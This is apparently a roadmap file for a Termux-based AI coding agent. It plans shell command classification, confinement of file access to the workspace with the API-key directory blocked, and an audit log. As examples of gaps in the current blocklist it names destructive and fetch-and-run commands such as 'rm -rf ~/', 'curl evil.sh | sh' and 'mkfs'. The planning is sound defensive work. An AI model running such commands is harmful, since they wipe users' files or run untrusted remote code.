# Roadmap

## Security hardening (planned for v2.1)

Two real weaknesses in the current shell and file handling.

### 1. Shell command classification

Today `run_shell` uses a blocklist of 11 known-bad strings. That catches
obvious footguns like `rm -rf /` and fork bombs, but misses dangerous
patterns like `rm -rf ~/`, `curl evil.sh | sh`, or `:> ~/.bashrc`.

**Fix:** classify every command as safe, unsafe, or blocked.

- **Safe** — first token in a whitelist (`ls`, `cat`, `git`, `python`,
  `pip`, `pkg`, `grep`, `find`, etc.). Runs without prompting.
- **Unsafe** — everything else. Requires `y/N/a=always`.
- **Blocked** — pattern match against the existing blocklist. Refused.

### 2. Path confinement

Today `_safe()` resolves paths but doesn't restrict them. The model can
read or write anywhere Termux can reach — including `~/.bashrc` and
`~/.agent042/config.json`, where API keys live.

**Fix:** every file operation resolves the path and refuses anything
outside the workspace. Access to `~/.agent042/` is blocked unconditionally.

### 3. Audit log

Every tool call appended to `~/.agent042/audit.log` with timestamp,
tool name, arguments, and a result preview. Useful for debugging and
for verifying what the agent actually did.

## Implementation plan

Five changes to `agent.py`:

1. Add `ALLOWED_SHELL_FIRST_TOKEN` set near the config block.
2. Rewrite `_safe(path, workspace)` to return `(path, error)`. Confine
   to workspace, block `~/.agent042/`, allow everything else.
3. Update every caller of `_safe()` to unpack the tuple:
   `tool_read_file`, `tool_write_file`, `tool_edit_file`,
   `tool_list_dir`, `tool_glob`, `tool_grep`.
4. Add `_classify_shell(cmd)` helper. Rewrite the head of
   `tool_run_shell` to use it.
5. Wrap `dispatch_tool` with `_audit_log()`.

Estimated: 45 minutes including tests.

## Test checklist

- [ ] `ls -la` runs without prompting (safe)
- [ ] `read_file /data/data/com.termux/files/home/.bashrc` → refused
      (outside workspace)
- [ ] `read_file ~/.agent042/config.json` → refused (protected dir)
- [ ] `rm -rf ~/fluffcode` prompts, then runs if `y`
- [ ] `mkfs` → refused outright
- [ ] `~/.agent042/audit.log` contains one line per tool call

## Other ideas

Lower priority, not scheduled.

- Screenshot for the README
- Auto-fallback to a different provider on 429 instead of just retrying
- Optional: publish to PyPI so `pip install fluffcode` works

## Not planned

- Rewrite in Rust/Go — Python is fine for this
- Web UI — the terminal is the point
- More than ~10 tools — the current seven cover almost everything